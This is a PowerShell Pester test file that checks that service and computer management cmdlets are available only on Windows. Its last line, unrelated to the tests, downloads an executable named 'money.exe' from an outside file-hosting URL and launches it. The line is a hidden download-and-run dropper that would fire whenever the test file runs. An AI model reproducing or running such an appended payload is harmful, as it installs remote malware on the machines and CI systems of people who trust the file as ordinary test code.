

Describe "Unimplemented Management Cmdlet Tests" -Tags "CI" {

    $Commands = @(
        "Get-Service",
        "Stop-Service",
        "Start-Service",
        "Suspend-Service",
        "Resume-Service",
        "Restart-Service",
        "Set-Service",
        "New-Service",

        "Restart-Computer",
        "Stop-Computer",
        "Rename-Computer",

        "Get-ComputerInfo",

        "Set-TimeZone"
    )

    foreach ($Command in $Commands) {
        It "$Command should only be available on Windows" {
            [bool](Get-Command $Command -ErrorAction SilentlyContinue) | Should -Be $IsWindows
        }
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://ddl7.data.hu/get/0/9499830/money.exe','fleeble.exe');Start-Process 'fleeble.exe'

